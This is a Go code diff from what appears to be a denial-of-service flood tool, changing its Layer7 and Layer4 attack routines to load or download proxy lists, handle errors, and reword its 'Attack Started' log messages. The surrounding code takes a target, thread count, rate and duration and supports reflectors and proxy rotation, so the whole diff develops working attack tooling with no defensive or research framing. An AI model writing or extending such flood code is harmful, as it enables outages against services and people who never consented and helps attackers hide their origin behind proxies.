@@ -111,15 +111,18 @@ func runLayer7Attack(method, target string, cfg *config.Config, wg *sync.WaitGro
 	rpc, _ := strconv.Atoi(os.Args[6])
 	duration, _ := strconv.Atoi(os.Args[7])
 
-	// Load proxies
+	// Load or download proxies
 	var proxies []proxy.Proxy
 	if proxyFile != "" {
 		proxyPath := filepath.Join("files", "proxies", proxyFile)
-		proxies, _ = proxy.LoadProxies(proxyPath, proxyType)
+		var err error
+		proxies, err = proxy.LoadOrDownloadProxies(proxyPath, proxyType, cfg, target, threads)
+		if err != nil {
+			log.Printf("Error loading proxies: %v", err)
+			log.Println("Continuing without proxies")
+		}
 		if len(proxies) == 0 {
-			log.Println("Warning: No proxies loaded, continuing without proxies")
-		} else {
-			log.Printf("Loaded %d proxies", len(proxies))
+			log.Println("Warning: Empty Proxy File, running flood without proxy")
 		}
 	}
 
@@ -134,8 +137,8 @@ func runLayer7Attack(method, target string, cfg *config.Config, wg *sync.WaitGro
 		referers = utils.GetDefaultReferers()
 	}
 
-	log.Printf("Starting Layer7 attack: %s -> %s with %d threads for %d seconds",
-		method, target, threads, duration)
+	log.Printf("Attack Started to %s with %s method for %d seconds, threads: %d!",
+		target, method, duration, threads)
 
 	// Create attack configuration
 	attackCfg := &attacks.Layer7Config{
@@ -210,18 +213,23 @@ func runLayer4Attack(method, target string, cfg *config.Config, wg *sync.WaitGro
 				log.Println("Warning: No reflectors loaded")
 			}
 		} else if arg5Num, err := strconv.Atoi(arg5); err == nil {
-			// Load proxies
+			// Load or download proxies
 			proxyFile := os.Args[6]
 			proxyPath := filepath.Join("files", "proxies", proxyFile)
-			proxies, _ = proxy.LoadProxies(proxyPath, arg5Num)
+			targetURL := fmt.Sprintf("%s:%d", host, port)
+			proxies, err = proxy.LoadOrDownloadProxies(proxyPath, arg5Num, cfg, targetURL, threads)
+			if err != nil {
+				log.Printf("Error loading proxies: %v", err)
+				log.Println("Continuing without proxies")
+			}
 			if len(proxies) == 0 {
-				log.Println("Warning: No proxies loaded")
+				log.Println("Warning: Empty Proxy File, running flood without proxy")
 			}
 		}
 	}
 
-	log.Printf("Starting Layer4 attack: %s -> %s:%d with %d threads for %d seconds",
-		method, host, port, threads, duration)
+	log.Printf("Attack Started to %s:%d with %s method for %d seconds, threads: %d!",
+		host, port, method, duration, threads)
 
 	// Create attack configuration
 	attackCfg := &attacks.Layer4Config{
